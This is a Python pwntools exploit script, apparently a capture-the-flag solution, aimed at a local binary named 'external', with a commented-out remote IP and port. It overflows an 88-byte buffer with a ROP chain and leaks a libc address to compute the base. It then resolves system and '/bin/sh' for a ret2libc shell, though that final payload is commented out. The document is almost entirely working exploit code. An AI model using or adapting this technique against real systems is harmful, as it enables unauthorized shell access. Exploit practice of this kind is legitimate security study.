from pwn import *
p = process("./external")
#p = remote("161.97.176.150", 9999)
pause()
elf = ELF("./external")
libc = elf.libc
#libc =  ELF("./libc-2.28.so")
pop_rdi = 0x4012f3
pop_rsi_r15 = 0x4012f1
ret = 0x40101a
main = 0x401224
mov_rax_leave = 0x401269
syscall = 0x401277
if __name__ == "__main__":
    p.recvuntil("> ")
    payload = ("a" * 88 + p64(pop_rdi) + p64(0x1) + p64(pop_rsi_r15) + p64(elf.symbols['stdin']) + p64(0x0) + p64(0x000000000040127C))
    payload += p64(0x004011a4)
    payload += p64(0x0000000000404080)
    payload += p64(0x00401269)
    payload += p64(pop_rdi) + p64(0x0) + p64(pop_rsi_r15) + p64(0x404018) + p64(0x0) + p64(0x41414141)
    p.sendline(payload)
    _IO_2_1_stdin_ = u64(p.recv(6) + "\x00\x00")
    p.success("_IO_2_1_stdin_ : " + hex(_IO_2_1_stdin_))
    libc_base = _IO_2_1_stdin_ - libc.symbols['_IO_2_1_stdin_']
    p.success("libc_base : " + hex(libc_base))
    system = libc_base + libc.symbols['system']
    binsh = libc_base + list(libc.search("/bin/sh"))[0]
    #p.sendline("a" * 88 + p64(pop_rdi) + p64(binsh) + p64(system) + p64(ret))
    p.interactive()
